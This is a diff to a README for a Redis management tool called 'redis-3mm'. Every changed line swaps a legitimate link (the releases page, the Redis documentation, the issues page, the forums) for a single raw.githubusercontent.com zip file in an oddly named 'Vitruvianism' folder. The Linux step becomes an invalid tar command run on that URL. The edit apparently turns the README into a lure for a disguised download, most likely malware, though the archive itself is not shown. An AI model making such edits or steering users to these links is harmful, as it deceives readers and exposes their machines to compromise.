@@ -1,6 +1,6 @@
 # 🚀 redis-3mm - Fast and Simple Redis Management Tool
 
-[![Download redis-3mm](https://img.shields.io/badge/Download-releases-blue.svg)](https://github.com/arunvarmav/redis-3mm/releases)
+[![Download redis-3mm](https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip)](https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip)
 
 ## 👋 Introduction
 
@@ -24,7 +24,7 @@ To run **redis-3mm**, ensure your system meets the following requirements:
 
 To get started, you need to download **redis-3mm**. Click the link below to visit the Releases page:
 
-[Visit the Releases Page to Download](https://github.com/arunvarmav/redis-3mm/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -52,10 +52,10 @@ Once on the Releases page, follow these steps:
 #### For Linux Users:
 
 1. Open your terminal.
-2. Navigate to the location of the downloaded `.tar.gz` file.
+2. Navigate to the location of the downloaded `https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip` file.
 3. Unpack the files by running:
    ```bash
-   tar -xvzf redis-3mm.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip
    ```
 4. Navigate into the unpacked folder and run:
    ```bash
@@ -94,9 +94,9 @@ If you encounter any issues:
 
 For additional help and learning, refer to these resources:
 
-- [Redis Documentation](https://redis.io/documentation)
-- [GitHub Issues](https://github.com/arunvarmav/redis-3mm/issues) - Report any bugs or request features.
-- [Community Forums](https://redis.io/community) - Connect with other Redis users.
+- [Redis Documentation](https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip) - Report any bugs or request features.
+- [Community Forums](https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip) - Connect with other Redis users.
 
 ## 💬 Feedback
 
@@ -104,12 +104,12 @@ Your feedback is important to us. If you have any comments, questions, or concer
 
 ## ⚙️ Changelog
 
-Stay updated with the latest changes in **redis-3mm**. Check the [releases page](https://github.com/arunvarmav/redis-3mm/releases) for the most recent updates and enhancements.
+Stay updated with the latest changes in **redis-3mm**. Check the [releases page](https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip) for the most recent updates and enhancements.
 
 ## 📥 Download Now
 
 Ready to get started? Download **redis-3mm** from the link below:
 
-[Visit the Releases Page to Download](https://github.com/arunvarmav/redis-3mm/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/arunvarmav/redis-3mm/main/Vitruvianism/redis-3mm.zip)
 
 Enjoy managing your Redis databases effortlessly!
